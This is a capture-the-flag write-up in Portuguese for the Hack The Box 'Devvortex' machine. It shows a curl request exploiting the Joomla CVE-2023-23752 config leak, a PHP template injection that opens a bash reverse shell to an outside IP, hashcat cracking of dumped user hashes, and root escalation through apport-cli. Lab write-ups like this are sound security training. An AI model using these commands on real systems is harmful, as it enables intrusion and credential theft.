# ****Devvortex****

 ### * Scan de portas
```bash
rustscan -a 10.10.11.242
```
![image](https://github.com/lufffe/Writeups/assets/90646635/04203fdd-74a7-4902-b29b-740ad6fa1011)

```bash
nmap -A -p 22,80 10.10.11.242
```
![image](https://github.com/lufffe/Writeups/assets/90646635/9db39e95-1f85-4f2e-a717-b0cd5d961156)

 ###  * Scan de Arquivos e Diretórios
```bash
ffuf -w directory-list-2.3-medium.txt -u http://devvortex.htb/FUZZ -e html,php,txt,sh,bkp -t 100
```
![image](https://github.com/lufffe/Writeups/assets/90646635/2f2803a0-0a0d-486d-9006-1fb15ca1552e)

- Não sei o que houve, mas não aparecia nada na busca por subdominios e tinha um chamado dev (VISTO EM WRITEUP)
![image](https://github.com/lufffe/Writeups/assets/90646635/d1244e54-1d83-4ad6-bd92-ee46237f1a14)

![image](https://github.com/lufffe/Writeups/assets/90646635/85d03106-e153-4aa2-8ebf-5ec860f75010)

```bash
ffuf -w wl/directory-list-2.3-medium.txt -u http://dev.devvortex.htb/FUZZ -e html,php,txt,sh,bkp -t 100
```
![image](https://github.com/lufffe/Writeups/assets/90646635/0ef0d5ef-8fa5-49df-96c4-a233b5b3fc8c)

 ###  * Pagina de login do Administrador
![image](https://github.com/lufffe/Writeups/assets/90646635/393aa113-9ce4-46f4-8145-118bc4a3fc52)

 ###  * Busca por exploit do Joomla
![image](https://github.com/lufffe/Writeups/assets/90646635/f8375ed9-1fb0-40de-97f1-b721d2ec62d5)

### * Encontrado um exploit em ruby
https://github.com/Acceis/exploit-CVE-2023-23752

- Como eu não conseguir executar o codigo em ruby / Procurei por outras formas
![image](https://github.com/lufffe/Writeups/assets/90646635/a1a7d4b6-00c9-43a1-8bb3-3fcc8e5de2ef)

### * Encontrado uma forma usando o curl
[https://luisfelipe146.medium.com/cve-2023-23752-joomla-acesso-impróprio-de-arquivos-não-autorizados-553d7e92d399](https://luisfelipe146.medium.com/cve-2023-23752-joomla-acesso-impr%C3%B3prio-de-arquivos-n%C3%A3o-autorizados-553d7e92d399)

root@server:/# curl http://localhost:8080/api/index.php/v1/config/application?public=true

### * Curl para conseguir as informações da falha de information disclosure do Joolma
```bash
curl http://dev.devvortex.htb/api/index.php/v1/config/application?public=true
```
![image](https://github.com/lufffe/Writeups/assets/90646635/ee9c674d-1e76-49dd-9131-a411bb07a820)

### * Login e senha Pagina administrador
lewis / P4ntherg0t1n5r3c0n##

## Site que eu achei como fazer um reverse shell no Joomla

https://vk9-sec.com/exploitation-reverse-shell-joomla/

**System->Templates->Administrator Templates**

![image](https://github.com/lufffe/Writeups/assets/90646635/b4831375-db69-47c0-bf17-5e56bd593cc2)

> **system("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.202/4455 0>&1'");**

## Retornando a pagina inicial o payload era executado
![image](https://github.com/lufffe/Writeups/assets/90646635/691af4d8-0107-4b34-8aca-8230a9ce1952)

- Conseguir a shell, mas o usuário era o www-data, não tinha permissão para ler a flag user
![image](https://github.com/lufffe/Writeups/assets/90646635/e6c3c74e-a9f5-4f84-8507-6813648a0f0f)

### * Acessando Mysql para procurar credenciais
```bash
mysql -u lewis -p
```
![image](https://github.com/lufffe/Writeups/assets/90646635/3884f3df-6c28-4485-82b1-e0d48791c0b9)

![image](https://github.com/lufffe/Writeups/assets/90646635/039b68c4-0868-4247-98c9-e423650877a8)

```bash
use joomla;
```

```bash
show tables;
```
![image](https://github.com/lufffe/Writeups/assets/90646635/bf43fe3c-6afb-4829-8b99-3e49f98adb1d)

```bash
select * from sd4fg_users;
```
![image](https://github.com/lufffe/Writeups/assets/90646635/7d15b93f-c78e-48cb-a75f-ff5fd4082030)

### * Encontrado logins e hash das senha
lewis / $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u

logan / $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12

### * Descobrindo a senha com o Hashcat
```bash
hashcat -m 3200 -a 0 hash.txt ../rockyou.txt
```
![image](https://github.com/lufffe/Writeups/assets/90646635/5639cc56-3621-46da-b0b6-681adfa41876)
> tequieromucho

![image](https://github.com/lufffe/Writeups/assets/90646635/762a185d-0b58-4ad9-abcb-fc7bb1485774)

### * Finalmente a flag User

```bash
cat user.txt
```

### * Procurando formas de escalar para Root
```bash
sudo -l
```
![image](https://github.com/lufffe/Writeups/assets/90646635/00e9fff7-49ed-4e92-a206-b25ac3634aed)

### * Encontrado uma fomra de escalar usando o apport-cli
https://vk9-sec.com/cve-2023-1326privilege-escalation-apport-cli-2-26-0/

```bash
sudo /usr/bin/apport-cli --file-bug
```

![image](https://github.com/lufffe/Writeups/assets/90646635/0cc86ff1-4d7c-4099-9d8e-f7f37bef92a3)

![image](https://github.com/lufffe/Writeups/assets/90646635/0843ee65-7fc6-4bc3-868a-39fc05df0085)

![image](https://github.com/lufffe/Writeups/assets/90646635/93afeb7d-a8f3-471c-be49-12cd7319f422)

```!/bin/bash```

### * E chegamos ao usuário root e finalizando pegando a flag Root
```bash
cat /root/root.txt
```
